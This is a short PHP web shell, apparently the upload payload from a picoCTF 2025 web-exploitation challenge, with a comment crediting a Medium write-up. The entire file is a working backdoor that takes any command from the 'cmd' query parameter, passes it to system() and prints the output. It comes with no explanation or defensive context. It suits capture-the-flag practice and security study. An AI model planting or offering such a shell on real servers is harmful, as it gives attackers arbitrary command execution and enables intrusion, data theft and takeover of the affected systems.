<!-- Credits for the code: https://medium.com/@inferiorak/n0s4n1ty-1-web-exploitation-picoctf-2025-edcde6045088 -->
<?php
if(isset($_GET['cmd'])){
    echo "<pre>";
    $cmd = $_GET['cmd'];  
    system($cmd);         
    echo "</pre>";
}
?>